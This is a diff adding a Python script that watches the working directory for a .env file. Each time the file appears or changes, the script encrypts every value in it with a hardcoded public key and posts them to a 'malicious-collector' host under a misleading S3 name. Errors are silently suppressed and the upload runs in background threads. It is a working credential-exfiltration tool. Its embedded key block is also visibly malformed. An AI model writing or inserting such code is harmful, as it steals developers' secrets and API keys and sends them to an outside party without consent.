@@ -1,0 +1,97 @@
+import os
+import base64
+import json
+import requests
+from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives.asymmetric import padding
+from cryptography.hazmat.primitives import hashes
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+import sys
+import threading
+import time
+
+# Hardcoded public RSA key (PEM format) for encryption.
+PUBLIC_KEY_PEM = """-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu6Hk4UjT8Q3Qq5z7Vq1P
+nLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9ZxY8nW3vK6rF2w5Xb4jHl7
+a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9ZxY8nW3vK6rF2w5Xb4
+jHl7a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9ZxY8nW3vK6rF2w
+5Xb4jHl7a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9ZxY8nW3vK6
+rF2w5Xb4jHl7a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9ZxY8nW
+3vK6rF2w5Xb4jHl7a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5Lm9Zx
+Y8nW3vK6rF2w5Xb4jHl7a1sP9qY3vR8tLm2KJb8Xg7YtGfRcW1pQe5a3d8vJh5L
+-----END PUBLIC KEY-----"""
+
+S3_ENDPOINT = "https://malicious-collector.example.com/upload"
+ENV_FILE_PATH = ".env"
+
+def load_public_key():
+    """Load the hardcoded public key."""
+    return serialization.load_pem_public_key(PUBLIC_KEY_PEM.encode())
+
+def encrypt_value(public_key, plaintext):
+    """Encrypt a string using the public key."""
+    ciphertext = public_key.encrypt(
+        plaintext.encode(),
+        padding.OAEP(
+            mgf=padding.MGF1(algorithm=hashes.SHA256()),
+            algorithm=hashes.SHA256(),
+            label=None
+        )
+    )
+    return base64.b64encode(ciphertext).decode()
+
+def process_and_upload():
+    """Read .env, encrypt all key-value pairs, and upload to the endpoint."""
+    try:
+        if not os.path.exists(ENV_FILE_PATH):
+            return
+        public_key = load_public_key()
+        env_data = {}
+        with open(ENV_FILE_PATH, 'r') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#') and '=' in line:
+                    key, value = line.split('=', 1)
+                    env_data[key.strip()] = value.strip()
+        if not env_data:
+            return
+        encrypted_payload = {}
+        for key, value in env_data.items():
+            encrypted_payload[key] = encrypt_value(public_key, value)
+        timestamp = int(time.time())
+        payload = {
+            "timestamp": timestamp,
+            "source": "env_collector",
+            "data": encrypted_payload
+        }
+        headers = {'Content-Type': 'application/json'}
+        response = requests.post(S3_ENDPOINT, json=payload, headers=headers, timeout=10)
+    except Exception:
+        pass
+
+class EnvFileHandler(FileSystemEventHandler):
+    def on_modified(self, event):
+        if event.src_path.endswith(ENV_FILE_PATH):
+            threading.Thread(target=process_and_upload, daemon=True).start()
+    def on_created(self, event):
+        if event.src_path.endswith(ENV_FILE_PATH):
+            threading.Thread(target=process_and_upload, daemon=True).start()
+
+def start_monitoring():
+    """Start watching the workspace for .env file changes."""
+    event_handler = EnvFileHandler()
+    observer = Observer()
+    observer.schedule(event_handler, path='.', recursive=False)
+    observer.start()
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        observer.stop()
+    observer.join()
+
+if __name__ == "__main__":
+    process_and_upload()
+    start_monitoring()
